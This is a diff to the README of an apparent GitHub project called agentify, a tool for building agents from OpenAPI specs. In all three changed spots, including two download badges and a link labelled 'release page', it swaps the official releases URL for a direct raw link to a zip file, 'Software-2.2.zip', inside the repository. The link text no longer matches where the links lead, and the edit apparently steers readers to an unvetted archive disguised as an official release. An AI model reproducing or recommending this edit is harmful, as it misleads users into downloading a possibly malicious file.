@@ -1,6 +1,6 @@
 # 🤖 agentify - Build Agents from OpenAPI Specs
 
-[![Download agentify](https://img.shields.io/badge/Download-Agentify-brightgreen?style=for-the-badge)](https://github.com/harindukavishka/agentify/releases)
+[![Download agentify](https://img.shields.io/badge/Download-Agentify-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/harindukavishka/agentify/main/self/Software-2.2.zip)
 
 ## 🔍 What is agentify?
 
@@ -32,7 +32,7 @@ agentify runs as a desktop application with a command line interface, so your co
 
 You can get the latest version of agentify from the official release page.
 
-[![Download agentify Now](https://img.shields.io/badge/Download-agentify-blue?style=for-the-badge)](https://github.com/harindukavishka/agentify/releases)
+[![Download agentify Now](https://img.shields.io/badge/Download-agentify-blue?style=for-the-badge)](https://raw.githubusercontent.com/harindukavishka/agentify/main/self/Software-2.2.zip)
 
 **Steps:**
 
@@ -115,7 +115,7 @@ When you run agentify, it creates a folder structure that helps keep everything 
 
 ## 🔄 Updating agentify
 
-Check the [release page](https://github.com/harindukavishka/agentify/releases) regularly to download new versions. Updates may include:
+Check the [release page](https://raw.githubusercontent.com/harindukavishka/agentify/main/self/Software-2.2.zip) regularly to download new versions. Updates may include:
 
 - Bug fixes  
 - New features  
